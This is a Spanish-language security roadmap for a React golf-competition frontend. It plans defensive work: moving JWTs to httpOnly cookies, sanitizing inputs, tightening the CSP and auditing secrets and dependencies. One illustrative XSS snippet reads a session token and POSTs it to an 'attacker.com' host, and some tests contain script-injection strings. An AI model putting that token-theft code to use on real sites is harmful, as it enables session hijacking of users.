# 🗺️ Roadmap - RyderCupFriends Frontend

> **Versión:** 1.7.0
> **Última actualización:** 27 Nov 2025
> **Estado general:** ✅ Producción

---

## 📊 Resumen Ejecutivo

### ✅ Completado (v1.0.0 - v1.7.0)

| Componente | Estado | Descripción |
|-----------|--------|-------------|
| **Clean Architecture** | ✅ 100% | Domain, Application, Infrastructure, Presentation |
| **Testing** | ✅ 419 tests | 35 archivos, ~5s ejecución, cobertura 90%+ |
| **Autenticación** | ✅ Completo | Login, Register, Email Verification, JWT |
| **Competiciones** | ✅ Completo | CRUD, Estados, Transiciones, Browse |
| **Enrollments** | ✅ 90% | Domain + Application completo, UI pendiente |
| **Handicaps** | ✅ Completo | Manual + RFEG (validación por país) |
| **Sentry** | ✅ Operacional | Error tracking, Performance, Session Replay |
| **Performance** | ✅ Optimizado | Code splitting, Lazy loading (-95% bundle) |
| **React Auto-Escaping** | ✅ Nativo | XSS protection por defecto |

### 📈 Métricas Clave

- **419 tests pasando** (100% pass rate)
- **Bundle inicial:** 47 KB (reducido de 978 KB)
- **Páginas:** 11 rutas (5 públicas, 6 protegidas)
- **Cobertura de tests:** Domain 100%, Application 90%, Utils 100%

---

## 🔐 SEGURIDAD - Mejoras Prioritarias

> **Análisis de seguridad completado:** 27 Nov 2025
>
> **Estado de protecciones:**
> - ✅ **XSS (React):** Protegido (auto-escaping, no dangerouslySetInnerHTML)
> - ⚠️ **XSS (Input Sanitization):** Básico (solo validación Pydantic en backend)
> - ⚠️ **CSP:** Parcial (`unsafe-inline` en script-src y style-src)
> - ⚠️ **Secretos:** Bien gestionado (.env, .gitignore correcto)
> - ❌ **httpOnly Cookies:** NO implementado (tokens en sessionStorage - CRÍTICO)
> - ⚠️ **Dependencias:** Revisar actualizaciones

### 🔴 Prioridad CRÍTICA (v1.8.0 - Semana 1-2)

#### 1. Migrar a httpOnly Cookies (JWT Tokens)
**Estado:** ❌ **NO IMPLEMENTADO - CRÍTICO**
**Estimación:** 4-6 horas (frontend) + coordinación con backend
**Impacto:** Elimina robo de tokens via XSS

**Problema Actual:**
```javascript
// ❌ VULNERABLE: Tokens en sessionStorage
// src/utils/secureAuth.js
const TOKEN_KEY = 'auth_token';

export const setAuthToken = (token) => {
  sessionStorage.setItem(TOKEN_KEY, token);  // ← Accesible desde JavaScript
};

export const getAuthToken = () => {
  return sessionStorage.getItem(TOKEN_KEY);
};
```

**Vulnerabilidad XSS:**
```javascript
// Si un atacante inyecta este script:
const token = sessionStorage.getItem('auth_token');
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token })
});
// ← Token robado
```

**Solución:**

**Paso 1: Backend implementa httpOnly cookies (ver Backend ROADMAP)**
```python
# Backend ya debe estar implementado
response.set_cookie(
    key="access_token",
    value=token,
    httponly=True,   # ✅ No accesible desde JavaScript
    secure=True,     # ✅ Solo HTTPS
    samesite="lax",  # ✅ Protección CSRF básica
    max_age=3600
)
```

**Paso 2: Frontend migra a cookies automáticas**

**Archivos a ELIMINAR:**
- `src/utils/secureAuth.js` - **ELIMINAR COMPLETAMENTE**

**Archivos a MODIFICAR:**

1. **src/infrastructure/auth/ApiAuthRepository.js**
```javascript
// ANTES (❌ VULNERABLE)
async login(credentials) {
  const response = await fetch(`${API_URL}/api/v1/auth/login`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(credentials)
  });

  const data = await response.json();
  setAuthToken(data.access_token);  // ← Guardar en sessionStorage
  return data;
}

// DESPUÉS (✅ SEGURO)
async login(credentials) {
  const response = await fetch(`${API_URL}/api/v1/auth/login`, {
    method: 'POST',
    credentials: 'include',  // ✅ Envía/recibe cookies automáticamente
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(credentials)
  });

  const data = await response.json();
  // NO guardar token manualmente - navegador maneja cookie
  return data;
}
```

2. **src/infrastructure/user/ApiUserRepository.js**
```javascript
// ANTES (❌)
async getCurrentUser() {
  const token = getAuthToken();  // ← Leer desde sessionStorage

  const response = await fetch(`${API_URL}/api/v1/auth/current-user`, {
    headers: {
      'Authorization': `Bearer ${token}`  // ← Header manual
    }
  });

  return response.json();
}

// DESPUÉS (✅)
async getCurrentUser() {
  const response = await fetch(`${API_URL}/api/v1/auth/current-user`, {
    credentials: 'include',  // ✅ Cookie automática
    headers: {
      'Content-Type': 'application/json'
      // NO incluir Authorization header
    }
  });

  return response.json();
}
```

3. **src/infrastructure/competition/ApiCompetitionRepository.js**
```javascript
// Agregar credentials: 'include' a TODAS las requests
async getCompetitions() {
  const response = await fetch(`${API_URL}/api/v1/competitions`, {
    credentials: 'include'  // ✅ Agregar en todos los métodos
  });
  return response.json();
}

async createCompetition(competitionData) {
  const response = await fetch(`${API_URL}/api/v1/competitions`, {
    method: 'POST',
    credentials: 'include',  // ✅ Agregar en todos los métodos
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(competitionData)
  });
  return response.json();
}
```

4. **src/infrastructure/enrollment/ApiEnrollmentRepository.js**
```javascript
// Agregar credentials: 'include' a TODAS las requests
async requestEnrollment(enrollmentData) {
  const response = await fetch(`${API_URL}/api/v1/enrollments`, {
    method: 'POST',
    credentials: 'include',  // ✅ Agregar
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(enrollmentData)
  });
  return response.json();
}
```

5. **src/pages/Login.jsx**
```javascript
// ANTES (❌)
const handleSubmit = async (e) => {
  e.preventDefault();
  const data = await apiAuthRepository.login(credentials);
  setAuthToken(data.access_token);  // ← Guardar manualmente
  localStorage.setItem('user', JSON.stringify(data.user));
  navigate('/dashboard');
};

// DESPUÉS (✅)
const handleSubmit = async (e) => {
  e.preventDefault();
  const data = await apiAuthRepository.login(credentials);
  // NO guardar token - navegador maneja cookie automáticamente
  localStorage.setItem('user', JSON.stringify(data.user));
  navigate('/dashboard');
};
```

6. **src/pages/Register.jsx**
```javascript
// Mismo cambio que Login.jsx
const handleSubmit = async (e) => {
  e.preventDefault();
  const data = await apiAuthRepository.register(userData);
  // NO guardar token manualmente
  localStorage.setItem('user', JSON.stringify(data.user));
  navigate('/dashboard');
};
```

7. **src/pages/Dashboard.jsx (Logout)**
```javascript
// ANTES (❌)
const handleLogout = () => {
  removeAuthToken();  // ← Eliminar de sessionStorage
  localStorage.removeItem('user');
  navigate('/');
};

// DESPUÉS (✅)
const handleLogout = async () => {
  // Llamar a endpoint de logout para eliminar cookie en backend
  await fetch(`${API_URL}/api/v1/auth/logout`, {
    method: 'POST',
    credentials: 'include'
  });

  // Solo limpiar localStorage (user data)
  localStorage.removeItem('user');
  navigate('/');
};
```

**Archivos a Modificar (Resumen):**
- ❌ `src/utils/secureAuth.js` - **ELIMINAR**
- ✏️ `src/infrastructure/auth/ApiAuthRepository.js` - Agregar `credentials: 'include'`
- ✏️ `src/infrastructure/user/ApiUserRepository.js` - Agregar `credentials: 'include'`
- ✏️ `src/infrastructure/competition/ApiCompetitionRepository.js` - Agregar `credentials: 'include'`
- ✏️ `src/infrastructure/enrollment/ApiEnrollmentRepository.js` - Agregar `credentials: 'include'`
- ✏️ `src/pages/Login.jsx` - No guardar token manualmente
- ✏️ `src/pages/Register.jsx` - No guardar token manualmente
- ✏️ `src/pages/Dashboard.jsx` - Logout con llamada a backend

**Testing:**
```javascript
// Manual testing checklist
// 1. Login → Verificar que funciona sin sessionStorage
console.log(sessionStorage.getItem('auth_token')); // Debe ser null

// 2. Dashboard → Verificar que user data se carga
// 3. Logout → Verificar que cookie se elimina (DevTools → Application → Cookies)
// 4. Request protegido → Verificar que funciona (perfil, competiciones)
```

**Impacto:**
- ✅ Elimina robo de tokens via XSS (JavaScript no puede acceder)
- ✅ Simplifica código (menos manejo manual de tokens)
- ✅ 80% protección CSRF con `samesite=lax`

**Coordinación requerida:**
- ⚠️ **Backend debe estar implementado PRIMERO**
- Ver: Backend ROADMAP punto 3 (httpOnly Cookies)
- Ver: Frontend ADR-004 (httpOnly Cookies Migration)

---

#### 2. Prevención de XSS (Input Sanitization)
**Estado:** ⚠️ **PARCIAL** (React auto-escaping funciona, sanitización manual falta)
**Estimación:** 3-4 horas
**Impacto:** Defensa en profundidad contra XSS

**Estado Actual - Protecciones Existentes:**
```javascript
// ✅ React auto-escaping funciona
<h1>{user.name}</h1>  // ← Seguro, React escapa automáticamente

// ✅ No uso de dangerouslySetInnerHTML
// Auditoría completada: No se encontró dangerouslySetInnerHTML en el código

// ⚠️ Falta validación en frontend antes de enviar
<input
  value={competitionName}
  onChange={(e) => setCompetitionName(e.target.value)}
  // ← No hay validación aquí
/>
```

**Problemas a Resolver:**

1. **Inputs no sanitizados antes de enviar al backend**
2. **Sin validación de formatos (emails, URLs)**
3. **Sin límites de longitud en frontend**

**Solución:**

**Opción 1: Validación Manual (Sin librerías)**
```javascript
// src/utils/inputValidation.js (CREAR)
export const sanitizeHTML = (input) => {
  // Eliminar tags HTML básicos
  return input.replace(/<[^>]*>/g, '');
};

export const validateCompetitionName = (name) => {
  if (!name || name.trim().length < 3) {
    return 'Name must be at least 3 characters';
  }
  if (name.length > 100) {
    return 'Name must be less than 100 characters';
  }
  if (/<|>/.test(name)) {
    return 'Name cannot contain HTML tags';
  }
  return null; // Valid
};

export const validateEmail = (email) => {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (!emailRegex.test(email)) {
    return 'Invalid email format';
  }
  return null;
};
```

**Uso en Formularios:**
```javascript
// src/pages/CreateCompetition.jsx
import { validateCompetitionName, sanitizeHTML } from '../utils/inputValidation';

const CreateCompetition = () => {
  const [formData, setFormData] = useState({
    name: '',
    location: ''
  });
  const [errors, setErrors] = useState({});

  const handleChange = (e) => {
    const { name, value } = e.target;

    // Sanitizar mientras el usuario escribe
    const sanitized = sanitizeHTML(value);

    setFormData(prev => ({
      ...prev,
      [name]: sanitized
    }));

    // Validar en tiempo real
    if (name === 'name') {
      const error = validateCompetitionName(sanitized);
      setErrors(prev => ({
        ...prev,
        name: error
      }));
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    // Validar todo antes de enviar
    const nameError = validateCompetitionName(formData.name);
    if (nameError) {
      setErrors({ name: nameError });
      return;
    }

    // Enviar datos sanitizados
    await apiCompetitionRepository.createCompetition(formData);
  };

  return (
    <form onSubmit={handleSubmit}>
      <input
        name="name"
        value={formData.name}
        onChange={handleChange}
        maxLength={100}  {/* Límite en HTML */}
      />
      {errors.name && <span className="text-red-600">{errors.name}</span>}

      <button type="submit" disabled={!!errors.name}>
        Create Competition
      </button>
    </form>
  );
};
```

**Opción 2: DOMPurify (Si se necesita sanitización avanzada)**
```bash
# Solo si se introduce rich text o HTML user-generated
npm install dompurify
```

```javascript
import DOMPurify from 'dompurify';

const sanitizedHTML = DOMPurify.sanitize(userInput);
```

**Archivos a Crear:**
- `src/utils/inputValidation.js` - Funciones de validación y sanitización

**Archivos a Modificar:**
- `src/pages/CreateCompetition.jsx` - Agregar validaciones
- `src/pages/Register.jsx` - Validar email, password
- `src/pages/EditProfile.jsx` - Validar nombres
- `src/pages/Login.jsx` - Validar formato de email

**Validaciones a Implementar por Formulario:**

| Página | Campo | Validación Requerida |
|--------|-------|---------------------|
| **Register** | email | Formato email, max 255 chars |
| **Register** | password | Min 8 chars, max 128 chars |
| **Register** | first_name | Min 1, max 50 chars, no HTML |
| **Register** | last_name | Min 1, max 50 chars, no HTML |
| **CreateCompetition** | name | Min 3, max 100 chars, no HTML |
| **CreateCompetition** | location | Min 3, max 200 chars, no HTML |
| **CreateCompetition** | max_players | Min 2, max 100 |
| **EditProfile** | first_name | Min 1, max 50 chars, no HTML |
| **EditProfile** | last_name | Min 1, max 50 chars, no HTML |

**Testing:**
```javascript
// tests/utils/inputValidation.test.js
import { validateCompetitionName, sanitizeHTML } from '../inputValidation';

describe('Input Validation', () => {
  test('rejects HTML tags', () => {
    const error = validateCompetitionName('<script>alert("xss")</script>');
    expect(error).toBeTruthy();
  });

  test('sanitizes HTML', () => {
    const input = '<b>Hello</b> World';
    const sanitized = sanitizeHTML(input);
    expect(sanitized).toBe('Hello World');
  });

  test('validates length', () => {
    const tooShort = validateCompetitionName('AB');
    expect(tooShort).toBeTruthy();

    const valid = validateCompetitionName('Valid Name');
    expect(valid).toBeNull();
  });
});
```

**Impacto:**
- ✅ Defensa en profundidad contra XSS (React + sanitización)
- ✅ Mejores mensajes de error para usuarios
- ✅ Prevención de datos inválidos en backend
- ✅ UX mejorada (validación en tiempo real)

---

### 🟡 Prioridad ALTA (v1.8.0 - Semana 3)

#### 3. Mejorar Content Security Policy (CSP)
**Estado:** ⚠️ **PARCIAL** (`unsafe-inline` presente)
**Estimación:** 2-3 horas
**Impacto:** Mejor protección contra XSS

**Problema Actual:**
```html
<!-- index.html -->
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self';
               script-src 'self' 'unsafe-inline';  ← ⚠️ VULNERABLE
               style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;  ← ⚠️ VULNERABLE
               font-src 'self' https://fonts.gstatic.com;
               img-src 'self' data: https:;
               connect-src 'self' https://rydercup-api.onrender.com;
               frame-ancestors 'none';
               base-uri 'self';
               form-action 'self';" />
```

**Problema:** `'unsafe-inline'` permite que scripts inyectados se ejecuten.

**Solución: Eliminar `unsafe-inline` y usar hashes o nonces**

**Opción 1: CSP con Hashes (Estático - Más Simple)**
```html
<!-- index.html -->
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self';
               script-src 'self' 'sha256-{hash-del-script}';
               style-src 'self' 'sha256-{hash-del-estilo}' https://fonts.googleapis.com;
               font-src 'self' https://fonts.gstatic.com;
               img-src 'self' data: https:;
               connect-src 'self' https://rydercup-api.onrender.com https://*.ingest.us.sentry.io;
               frame-ancestors 'none';
               base-uri 'self';
               form-action 'self';" />
```

**Calcular hashes:**
```bash
# Obtener hash SHA-256 de inline scripts/styles
echo -n 'script content here' | openssl dgst -sha256 -binary | openssl base64
```

**Opción 2: CSP con Nonces (Dinámico - Más Seguro)**
```javascript
// vite.config.js - Plugin para inyectar nonces
import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';
import crypto from 'crypto';

const noncePlugin = () => {
  return {
    name: 'vite-plugin-csp-nonce',
    transformIndexHtml(html) {
      const nonce = crypto.randomBytes(16).toString('base64');
      return html
        .replace(
          /<script/g,
          `<script nonce="${nonce}"`
        )
        .replace(
          /<style/g,
          `<style nonce="${nonce}"`
        )
        .replace(
          '{NONCE}',
          nonce
        );
    }
  };
};

export default defineConfig({
  plugins: [react(), noncePlugin()]
});
```

```html
<!-- index.html -->
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self';
               script-src 'self' 'nonce-{NONCE}';  ← Placeholder
               style-src 'self' 'nonce-{NONCE}' https://fonts.googleapis.com;
               font-src 'self' https://fonts.gstatic.com;
               img-src 'self' data: https:;
               connect-src 'self' https://rydercup-api.onrender.com https://*.ingest.us.sentry.io;
               frame-ancestors 'none';
               base-uri 'self';
               form-action 'self';" />
```

**Opción 3: CSP Solo en HTTP Headers (Render.com)**
```
# render.yaml o Render Dashboard → Headers
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com; img-src 'self' data: https:; connect-src 'self' https://rydercup-api.onrender.com https://*.ingest.us.sentry.io; frame-ancestors 'none'; base-uri 'self'; form-action 'self';
```

**Recomendación:** Empezar con Opción 3 (HTTP Headers) por simplicidad.

**Archivos a Modificar:**
- `index.html` - Eliminar meta tag CSP si se usa headers
- `render.yaml` - Agregar header CSP (crear archivo)
- `vite.config.js` - Solo si se usa nonces

**Verificación:**
```bash
# Verificar headers
curl -I https://rydercup.onrender.com

# Debe mostrar:
# Content-Security-Policy: default-src 'self'; script-src 'self'; ...
```

**Testing:**
```javascript
// Intentar inyectar script inline (debe fallar)
const script = document.createElement('script');
script.innerHTML = 'alert("xss")';
document.body.appendChild(script);
// ← CSP debe bloquear esto
```

**Impacto:**
- ✅ Elimina `unsafe-inline` (previene XSS inline)
- ✅ Solo permite scripts del mismo origen
- ✅ Sentry URLs permitidas para error tracking

---

#### 4. Auditoría de Secretos (Verificación)
**Estado:** ✅ **BIEN GESTIONADO** (verificar que se mantenga)
**Estimación:** 1 hora (auditoría)
**Impacto:** Mantener protección actual

**Estado Actual:**

✅ **Buenas prácticas implementadas:**
```javascript
// ✅ Variables de entorno
// .env
VITE_API_BASE_URL=http://localhost:8000
VITE_SENTRY_DSN=https://xxx@xxx.ingest.us.sentry.io/xxx
VITE_ENVIRONMENT=production

// ✅ .gitignore correcto
.env
.env.local
.env.production
.env.*.local

// ✅ Uso en código
const API_URL = import.meta.env.VITE_API_BASE_URL || 'http://localhost:8000';
```

**Auditoría Recomendada:**
```bash
# Buscar posibles secretos hardcodeados
cd /Users/agustinestevezdominguez/Documents/RyderCupWeb

# Buscar API keys hardcoded
grep -r "api_key" src/
grep -r "apiKey" src/
grep -r "secret" src/

# Buscar URLs hardcoded (deben estar en .env)
grep -r "http://" src/
grep -r "https://" src/

# Verificar que .env no está en git
git ls-files | grep ".env"
# ← Debe estar vacío
```

**Verificaciones:**
- [ ] No hay API keys hardcoded en src/
- [ ] No hay tokens hardcoded en src/
- [ ] Todas las URLs usan import.meta.env.VITE_*
- [ ] .env está en .gitignore
- [ ] .env.example existe con placeholders

**Si se encuentran secretos:**
```javascript
// ❌ INCORRECTO
const API_URL = 'https://api.rydercup.com';
const SENTRY_DSN = 'https://xxx@xxx.ingest.us.sentry.io/123456';

// ✅ CORRECTO
const API_URL = import.meta.env.VITE_API_BASE_URL;
const SENTRY_DSN = import.meta.env.VITE_SENTRY_DSN;
```

**Crear .env.example:**
```bash
# .env.example (CREAR si no existe)
VITE_API_BASE_URL=http://localhost:8000
VITE_SENTRY_DSN=your_sentry_dsn_here
VITE_ENVIRONMENT=development
VITE_APP_VERSION=1.7.0
```

**Impacto:**
- ✅ Mantener protección actual (excelente)
- ✅ Facilitar onboarding de nuevos desarrolladores (.env.example)
- ✅ Prevenir leaks de secretos en git

---

#### 5. Auditoría y Actualización de Dependencias
**Estado:** ⚠️ **REVISAR**
**Estimación:** 2-3 horas
**Impacto:** Prevención de vulnerabilidades conocidas

**Estado Actual:**
```json
// package.json (versiones aproximadas)
{
  "dependencies": {
    "react": "^18.2.0",
    "react-dom": "^18.2.0",
    "react-router-dom": "^6.20.0",
    "@sentry/react": "^7.91.0",
    "react-hot-toast": "^2.4.1"
  },
  "devDependencies": {
    "vite": "^5.0.8",
    "@vitejs/plugin-react": "^4.2.1",
    "tailwindcss": "^3.4.0",
    "vitest": "^1.0.4"
  }
}
```

**Proceso de Auditoría:**

**Paso 1: Auditar vulnerabilidades conocidas**
```bash
# Verificar vulnerabilidades con npm audit
npm audit

# Ver detalles de vulnerabilidades
npm audit --json

# Corregir automáticamente (revisar cambios)
npm audit fix

# Si hay breaking changes:
npm audit fix --force  # ⚠️ Revisar cuidadosamente
```

**Paso 2: Verificar dependencias desactualizadas**
```bash
# Listar dependencias desactualizadas
npm outdated

# Output ejemplo:
# Package             Current  Wanted   Latest
# react               18.2.0   18.2.0   18.3.1
# @sentry/react       7.91.0   7.91.0   8.5.0
```

**Paso 3: Actualizar dependencias críticas**
```bash
# Actualizar React y React DOM
npm install react@latest react-dom@latest

# Actualizar Vite
npm install -D vite@latest

# Actualizar Sentry (revisar breaking changes)
npm install @sentry/react@latest

# Actualizar todas las minor/patch (seguras)
npm update
```

**Paso 4: Testing después de updates**
```bash
# Correr tests
npm test

# Verificar build
npm run build

# Verificar dev server
npm run dev

# Verificar que la app funciona
# - Login/Logout
# - Crear competición
# - Navegación entre páginas
# - Sentry tracking
```

**Dependencias Críticas a Mantener Actualizadas:**

| Dependencia | Razón | Frecuencia de Revisión |
|-------------|-------|----------------------|
| **react** | Seguridad, performance | Mensual |
| **react-dom** | Seguridad, performance | Mensual |
| **react-router-dom** | Seguridad, navegación | Mensual |
| **@sentry/react** | Error tracking, seguridad | Mensual |
| **vite** | Build tool, seguridad | Mensual |
| **tailwindcss** | Styling, no crítico | Trimestral |

**Proceso Mensual Recomendado:**
1. Ejecutar `npm audit` y `npm outdated`
2. Revisar release notes de dependencias críticas
3. Actualizar en ambiente local
4. Testing exhaustivo
5. Deploy a staging
6. Testing en staging
7. Deploy a producción

**Crear Script de Auditoría:**
```json
// package.json
{
  "scripts": {
    "audit": "npm audit && npm outdated",
    "audit:fix": "npm audit fix && npm test",
    "update:safe": "npm update && npm test",
    "update:all": "npm update && npm install react@latest react-dom@latest && npm test"
  }
}
```

**Impacto:**
- ✅ Prevención de vulnerabilidades conocidas
- ✅ Mejoras de performance y estabilidad
- ✅ Compatibilidad con últimas features

---

### 🟢 Prioridad MEDIA (v1.9.0)

#### 6. Implementar Error Boundaries Adicionales
**Estado:** ⚠️ **BÁSICO** (solo Sentry Error Boundary)
**Estimación:** 2-3 horas
**Impacto:** Mejor UX en caso de errores

**Crear Error Boundaries por Módulo:**
```javascript
// src/components/errors/FeatureErrorBoundary.jsx
import React from 'react';
import { useNavigate } from 'react-router-dom';

class FeatureErrorBoundary extends React.Component {
  constructor(props) {
    super(props);
    this.state = { hasError: false, error: null };
  }

  static getDerivedStateFromError(error) {
    return { hasError: true, error };
  }

  componentDidCatch(error, errorInfo) {
    console.error('Feature Error:', error, errorInfo);
    // Sentry ya captura errores globalmente
  }

  render() {
    if (this.state.hasError) {
      return (
        <div className="min-h-screen flex items-center justify-center">
          <div className="text-center">
            <h1 className="text-2xl font-bold text-red-600 mb-4">
              Oops! Something went wrong
            </h1>
            <p className="text-gray-600 mb-4">
              {this.props.featureName} encountered an error.
            </p>
            <button
              onClick={() => window.location.reload()}
              className="px-4 py-2 bg-primary text-white rounded-lg"
            >
              Reload Page
            </button>
          </div>
        </div>
      );
    }

    return this.props.children;
  }
}

export default FeatureErrorBoundary;
```

**Impacto:**
- ✅ Mejor UX cuando hay errores
- ✅ Prevención de crash total de la app

---

## 🛠️ Desarrollo - Tareas Pendientes

### Módulo de Enrollments

#### Integrar Use Cases en UI
**Estado:** ⏳ Pendiente
**Prioridad:** 🟡 Media
**Estimación:** 2-3 horas

**Archivos a Modificar:**
- `src/pages/CompetitionDetail.jsx` - Usar use cases en lugar de servicios
- `src/pages/BrowseCompetitions.jsx` - Usar `requestEnrollmentUseCase`

---

### Módulo de Perfil

#### Sistema de Foto de Perfil
**Estado:** 🔒 Bloqueado por backend
**Requiere:**
- Campo `avatar_url` en modelo User (backend)
- Endpoint `PUT /api/v1/users/avatar` (multipart/form-data)
- Almacenamiento (S3, Cloudinary, o local)

---

## 🧪 Testing

### Estado Actual
- ✅ **419 tests pasando** (100% success rate)
- ✅ Domain Layer: 100% cobertura
- ✅ Application Layer: 90% cobertura
- ⏳ Enrollment Use Cases: 0% (no prioritario)

### Próximos Tests
- Tests de validación de inputs (inputValidation.test.js)
- Tests E2E con Playwright (no iniciado)
- Tests de integración de Enrollments UI
- Tests de seguridad (CSP, XSS attempts)

---

## 📦 Optimización

### Completado
- ✅ Code splitting (manual chunks)
- ✅ Lazy loading de rutas
- ✅ Bundle reducido 95% (978 KB → 47 KB)
- ✅ Suspense con loading fallback

### Futuras Optimizaciones
- Preload de rutas críticas
- Service Worker para offline (PWA)
- Image optimization (AVIF/WebP)

---

## 🚀 Roadmap de Versiones

### v1.8.0 (Próxima - Security Release) - Estimado: 2-3 semanas

**Objetivo:** Securizar el frontend contra ataques comunes

**Semana 1: httpOnly Cookies (Backend)**
- Esperar a que backend implemente httpOnly cookies
- Revisar cambios en API
- Preparar cambios en repositories

**Semana 2: httpOnly Cookies (Frontend)**
- 🔐 Eliminar `src/utils/secureAuth.js` - 1h
- 🔐 Agregar `credentials: 'include'` en todos los repositories - 2h
- 🔐 Actualizar Login/Register/Dashboard (logout) - 2h
- 🧪 Testing exhaustivo - 2h

**Semana 3: Input Sanitization + CSP**
- 🔐 Crear `src/utils/inputValidation.js` - 2h
- 🔐 Agregar validaciones en formularios - 2h
- 🔐 Mejorar CSP (eliminar unsafe-inline) - 2h
- 🔐 Auditoría de secretos - 1h
- 🔐 Actualización de dependencias - 2h
- 🧪 Testing de seguridad - 2h

**Total estimado:** 18-22 horas de desarrollo

---

### v1.9.0 (Funcionalidad) - 1-2 meses después
- 👤 Sistema de avatares
- 📝 Gestión de errores centralizada
- 🎨 UI de enrollments refactorizada
- 🧪 Tests E2E con Playwright

---

### v2.0.0 (Mayor - Futuro) - 4-6 meses
- 🔐 Autenticación de dos factores (2FA)
- 📱 Progressive Web App (PWA)
- 🌍 Internacionalización (i18n)
- 🎮 Sistema de equipos y torneos

---

## 📝 Notas de Implementación

### Orden Recomendado de Implementación (v1.8.0)

**Día 1-5: Esperar Backend (httpOnly cookies)**
- Backend implementa httpOnly cookies
- Backend implementa rate limiting
- Backend implementa security headers

**Día 6-7: httpOnly Cookies Frontend**
1. Eliminar `src/utils/secureAuth.js`
2. Agregar `credentials: 'include'` en repositories
3. Actualizar Login/Register/Logout
4. Testing local
5. Deploy a staging

**Día 8-10: Input Sanitization**
1. Crear `src/utils/inputValidation.js`
2. Agregar validaciones en CreateCompetition
3. Agregar validaciones en Register
4. Agregar validaciones en EditProfile
5. Tests unitarios de validación

**Día 11-12: CSP + Auditorías**
1. Mejorar CSP (eliminar unsafe-inline)
2. Auditoría de secretos
3. Actualización de dependencias
4. npm audit fix
5. Testing exhaustivo

**Día 13-15: Testing y Deploy**
1. Testing conjunto frontend + backend
2. Verificar que httpOnly cookies funcionan
3. Verificar validaciones de inputs
4. Verificar CSP no rompe nada
5. Deploy a producción
6. Monitoreo con Sentry

---

### Coordinación Frontend-Backend

**Para cambios de seguridad (httpOnly cookies):**
1. ⚠️ **Backend implementa PRIMERO** (semana 1-2)
2. Frontend adapta DESPUÉS (semana 2-3)
3. Testing exhaustivo en staging
4. Deploy coordinado
5. Monitoreo post-deploy (Sentry)

---

## 🔗 Referencias

- [React Security Best Practices](https://react.dev/learn/security)
- [OWASP XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [CSP Guide](https://web.dev/csp/)
- [npm audit Documentation](https://docs.npmjs.com/cli/v9/commands/npm-audit)
- Backend ROADMAP: `../RyderCupAm/ROADMAP.md`
- Frontend ADR-004: httpOnly Cookies Migration
- Frontend ADR-005: Sentry Error Tracking

---

**Última revisión:** 27 Nov 2025
**Próxima revisión:** Después de v1.8.0 (Security Release)
**Responsable:** Equipo de desarrollo frontend
